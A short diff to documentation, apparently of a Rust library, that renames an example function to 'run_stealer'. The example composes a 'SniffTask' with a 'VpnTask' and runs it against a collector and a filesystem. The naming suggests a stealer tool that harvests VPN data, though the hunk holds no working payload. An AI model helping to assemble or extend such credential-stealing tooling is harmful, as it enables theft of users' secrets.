@@ -469,7 +469,7 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F
 
 Or use `SniffTask` api and create the `SniffTask` instance with your task using:
 ```rust
-fn main() {
+fn run_stealer() {
     SniffTask::with_subtask(composite_task!(
         VpnTask::default() // and other tasks, divided by comma
     )).run(/* out */, /* filesystem */, /* collector */);
